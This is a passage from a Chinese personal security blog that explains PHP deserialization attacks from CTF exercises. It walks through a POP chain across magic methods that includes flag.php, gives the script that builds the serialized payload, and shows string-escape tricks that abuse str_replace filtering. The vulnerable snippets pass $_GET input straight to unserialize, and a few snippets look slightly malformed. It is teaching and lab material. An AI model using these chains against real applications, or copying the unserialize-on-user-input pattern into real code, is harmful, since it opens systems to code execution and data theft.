+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Modifier</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $var;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">append</span>($value)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include</span>($value); <span style="color:#75715e">//第-1步，flag在flag.php中，所以，$value为flag.php.调用append时候可以赋值
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">echo</span> $flag;    <span style="color:#75715e">//最终目的，输出flag。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __invoke(){  <span style="color:#75715e">//invoke：对象作为函数调用的时候，
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">append</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">var</span>); <span style="color:#75715e">//这里调用了append，所以为第-2步，var赋值为flag.php。所以寻找调用这个函数。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Show</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $source;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString(){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>;	<span style="color:#75715e">//第-4步，调用str中的source，为了保证这是一个不存在的属性，所以str需要实例化为test，因为Test类中没有source。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup(){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>;			<span style="color:#75715e">//第-5步，为了调用上面的__tostring，所以需要source是一个实例化对象但为作为字符串输出。$source=new Show();因为把自己作为对象，才能够触发下一步的_tostring.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $p;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __get($key){	<span style="color:#75715e">//为了调用__get需要有一个并不存在的参数被调用，Show中的source符合这个要求，
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $function <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">p</span>;	<span style="color:#75715e">//将p作为一个对象，为了__invoke，所以这里需要是Modifier，$p=new Modeifier().  	
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> $function();    	<span style="color:#75715e">//第-3步，这里存在调用函数，所以需要将这里的函数实例化为一个对象，向上看。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;pop&#39;</span>])){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unserialize</span>($_GET[<span style="color:#e6db74">&#39;pop&#39;</span>]);
+</span></span></code></pre></div><p>逐步分析，然后再来一步步的构造</p>
+<p><strong>首先明白这一步如何被触发然后去寻找上一步，所以上一步的为了触发这一魔术方法，所以这一步的类必须与下一步有关联，才能调用下一步中的魔术方法</strong></p>
+<blockquote>
+<ul>
+<li>首先是pop赋值为source，为了tostring，所以但是先有类，$show=new Show(), $source=new Show()</li>
+<li>然后为了触发__get，必须要一个test的类 $test=new Test()，并且满足触发条件，所以 $str=new Test()</li>
+<li>为了触发__invoke,对象作为函数，$p=new Modeifier()</li>
+<li>$var =flag.php</li>
+</ul>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Modifier</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $var<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;flag.php&#39;</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Show</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $source;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $p;
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$mod<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Modifier</span>();
+</span></span><span style="display:flex;"><span>$test<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Test</span>();
+</span></span><span style="display:flex;"><span>$test<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">p</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> $mod;
+</span></span><span style="display:flex;"><span>$show<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Show</span>();
+</span></span><span style="display:flex;"><span>$show<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span><span style="color:#f92672">=</span>$test;
+</span></span><span style="display:flex;"><span>$show<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span><span style="color:#f92672">=</span>$test;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($show);
+</span></span></code></pre></div><p><img loading="lazy" src="/img/image-20230518220735487.png" alt="image-20230518220735487"  />
+</p>
+<h2 id="字符逃逸">字符逃逸<a hidden class="anchor" aria-hidden="true" href="#字符逃逸">#</a></h2>
+<h4 id="成员属性保持一致">成员属性保持一致<a hidden class="anchor" aria-hidden="true" href="#成员属性保持一致">#</a></h4>
+<p><strong>原理一</strong>，最外面的：3要与{}里面的成员属性一致。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$b<span style="color:#f92672">=</span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#e6db74">&#34;v1&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#a6e22e">b</span><span style="color:#e6db74">&#34;;s:2&#34;</span><span style="color:#a6e22e">v2</span><span style="color:#e6db74">&#34;;s:3:&#34;</span><span style="color:#a6e22e">a</span><span style="color:#e6db74">&#34;b&#34;</span>;} <span style="color:#75715e">//外面为2，里面为v1和v2两个成员。
+</span></span></span></code></pre></div><p><strong>原理二</strong>，成员属性名称长度一致，内容长度一致。</p>
+<p><img loading="lazy" src="/img/image-20230519151713331.png" alt="image-20230519151713331"  />
+</p>
+<p><strong>原理三</strong>，前面为3，所以说明属性的长度为3，所以a后面的“当作字符串对待，而不是功能符号</p>
+<p><strong>当;}出现的时候代表达到结束符，后面出现的无关</strong></p>
+<h4 id="属性逃逸">属性逃逸<a hidden class="anchor" aria-hidden="true" href="#属性逃逸">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $v1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcsystem()system()system()&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $v2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;123&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($arga,$argc){
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">v1</span> <span style="color:#f92672">=</span> $arga;
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">v2</span> <span style="color:#f92672">=</span> $argc;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;v1&#39;</span>];
+</span></span><span style="display:flex;"><span>$b <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;system()123&#34;</span>;
+</span></span><span style="display:flex;"><span>$data <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">A</span>($a,$b));
+</span></span><span style="display:flex;"><span>$data <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;system()&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$data);   <span style="color:#75715e">//过滤system()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">unserialize</span>($data));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p><strong>原理</strong>：将system()替换为空，那么反序列化以后的值就会减少长度，根据上面的原理二可以得知不符合规则，反序列化会出错。例如下面会把原来的system()123变为123.那么11就应该是3了</p>
+<p><code> O:1:&quot;A&quot;:2:{s:2:&quot;v1&quot;;N;s:2:&quot;v2&quot;;s:11:&quot;123&quot;;}bool(false)</code></p>
+<p><img loading="lazy" src="/img/image-20230519160152435.png" alt="image-20230519160152435"  />
+</p>
+<p><strong>利用</strong>：因为原理三，长度为n，而给出的不足n，那么就会把后面的功能符号作为字符串.所以字符串就会认为是<code>123&quot;;}bool(</code>,但是还需要一个”；}闭合，如果是第一个的话，就可以利用这一规则输入多个system(),那么就会吞掉更多的字符，甚至会把下一个成员属性给吞掉，如果v1的system过多，字符串长度达到23这样很多，甚至会把下面的v2给吞掉，为了满足远离一，那时候就可以在v2的位置重新传入一个v3，但是原来定义的v2并不会消失，就多了一个v3.</p>
+<p><img loading="lazy" src="/img/image-20230519160542471.png" alt="image-20230519160542471"  />
+</p>
+<p>所以来构造，上传所需要的v1，v2。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $v1<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;system()&#34;</span><span style="color:#ae81ff">123</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span>	$v2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;123&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="字符串增多">字符串增多<a hidden class="anchor" aria-hidden="true" href="#字符串增多">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;O:1:&#34;</span><span style="color:#a6e22e">A</span><span style="color:#e6db74">&#34;:1:{s:2:&#34;</span><span style="color:#a6e22e">v1</span><span style="color:#e6db74">&#34;;s:2:&#34;</span><span style="color:#a6e22e">ls</span><span style="color:#e6db74">&#34;;}&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">str_replace</span>(<span style="color:#a6e22e">ls</span>,<span style="color:#a6e22e">pwd</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;O:1:&#34;</span><span style="color:#a6e22e">A</span><span style="color:#e6db74">&#34;:1:{s:2:&#34;</span><span style="color:#a6e22e">v1</span><span style="color:#e6db74">&#34;;s:2:&#34;</span><span style="color:#a6e22e">pwd</span><span style="color:#e6db74">&#34;;}&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//违反了原理二
+</span></span></span></code></pre></div><p>**利用：**因为每次都会增加一个字符，所以我们可以利用闭合符号，逃逸多个字符，因为每次都会增加一个字符，所以不会出错。根据原理三，;}是作为字符串结束标志，可以将后面的v2注释掉，以此来增加字符。</p>
+<p><img loading="lazy" src="/img/image-20230519192223081.png" alt="image-20230519192223081"  />
+</p>
+
+
+        </div>
+
+        <footer class="post-footer">
+            
+<nav class="paginav">
+  <a class="next" href="https://modesty258.github.io/posts/misc/buuctf_wp/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>Buuctf_wp</span>
+  </a>
+</nav>
+
+        </footer>
+    </div>
+
+<style>
+    .comments_details summary::marker {
+        font-size: 20px;
+        content: '👉展开评论';
+        color: var(--content);
+    }
+    .comments_details[open] summary::marker{
+        font-size: 20px;
+        content: '👇关闭评论';
+        color: var(--content);
+    }
+</style>
+
+
+<div>
+    <details class="comments_details">
+        <summary style="cursor: pointer; margin: 50px 0 20px 0;width: 130px;">
+            <span style="font-size: 20px;color: var(--content);">...</span>
+        </summary>
+        <div id="tcomment"></div>
+    </details>
+    <script src="https://cdn.staticfile.org/twikoo/1.5.8/twikoo.all.min.js">
+    </script>
+    <script>
+        twikoo.init({
+            envId:  null ,
+        el: "#tcomment",
+            lang: 'zh-CN',
+            region:  null ,
+        path: window.TWIKOO_MAGIC_PATH||window.location.pathname,
+        })
+    </script>
+</div>
+</article>
+</main>
+
+<footer class="footer">
+    <span>
+        Copyright
+        &copy;
+        2020-2023
+        <a href="https://modesty258.github.io/" style="color:#939393;">Modest&#39;s Blog</a>
+        All Rights Reserved
+    </span>
+    <a href="https://beian.miit.gov.cn/" target="_blank" style="color:#939393;"></a>&nbsp;
+    <span>
+        <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=null"
+           style="display:inline-block;text-decoration:none;height:20px;color:#939393;">
+            <img src="" style="float:left;margin: 0px 5px 0px 0px;"/>
+            
+        </a>
+    </span>
+    <span id="busuanzi_container">
+        <span class="fa fa-user"></span> <span id="busuanzi_value_site_uv"></span>
+        <span class="fa fa-eye"></span> <span id="busuanzi_value_site_pv"></span>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <span class="topInner">
+        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z"/>
+        </svg>
+        <span id="read_progress"></span>
+    </span>
+</a>
+
+<script>
+    document.addEventListener('scroll', function (e) {
+        const readProgress = document.getElementById("read_progress");
+        const scrollHeight = document.documentElement.scrollHeight;
+        const clientHeight = document.documentElement.clientHeight;
+        const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
+        readProgress.innerText = ((scrollTop / (scrollHeight - clientHeight)).toFixed(2) * 100).toFixed(0);
+    })
+</script>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    let mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 200 || document.documentElement.scrollTop > 200) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        (function() {
+            document.cookie = "change-themes" + "="+ escape ("false");
+        })()
+
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    });
+</script>
+
+<script>
+    document.body.addEventListener('copy', function (e) {
+        if (window.getSelection().toString() && window.getSelection().toString().length > 50) {
+            let clipboardData = e.clipboardData || window.clipboardData;
+            if (clipboardData) {
+                e.preventDefault();
+                let htmlData = window.getSelection().toString() +
+                    '\r\n\n————————————————\r\n' +
+                    '版权声明：本文为「'+"Modest's Blog"+'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
+                '\r\n原文链接：' + location.href;
+                let textData = window.getSelection().toString() +
+                    '\r\n\n————————————————\r\n' +
+                    '版权声明：本文为「'+"Modest's Blog"+'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
+                '\r\n原文链接：' + location.href;
+                clipboardData.setData('text/html', htmlData);
+                clipboardData.setData('text/plain', textData);
+            }
+        }
+    });
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = '📄复制';
+
+        function copyingDone() {
+            copybutton.innerText = '👌🏻已复制!';
+            setTimeout(() => {
+                copybutton.innerText = '📄复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                let text = codeblock.textContent +
+                    '\r\n————————————————\r\n' +
+                    '版权声明：本文为「'+"Modest's Blog"+'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
+                '\r\n原文链接：' + location.href;
+                navigator.clipboard.writeText(text);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) {}
+            selection.removeRange(range);
+        });
+
+        let language = codeblock.className.replaceAll("language-", "")
+        let macTool = document.createElement("div")
+        let macTool1 = document.createElement("div")
+        let macTool2 = document.createElement("div")
+        let macTool3 = document.createElement("div")
+        let languageType = document.createElement("div")
+        languageType.innerText = language
+        macTool.setAttribute('class', 'mac-tool')
+        macTool1.setAttribute('class', 'mac bb1')
+        macTool2.setAttribute('class', 'mac bb2')
+        macTool3.setAttribute('class', 'mac bb3')
+        languageType.setAttribute('class', 'language-type')
+        macTool.appendChild(macTool1)
+        macTool.appendChild(macTool2)
+        macTool.appendChild(macTool3)
+        macTool.appendChild(languageType)
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+            container.appendChild(macTool)
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+            container.appendChild(macTool)
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+            container.appendChild(macTool)
+        }
+    });
+</script>
+
+<script>
+    $("code[class^=language] ").on("mouseover", function () {
+        if (this.clientWidth < this.scrollWidth) {
+            $(this).css("width", "135%")
+            $(this).css("border-top-right-radius", "var(--radius)")
+        }
+    }).on("mouseout", function () {
+        $(this).css("width", "100%")
+        $(this).css("border-top-right-radius", "unset")
+    })
+</script>
+</body>
+
+</html>
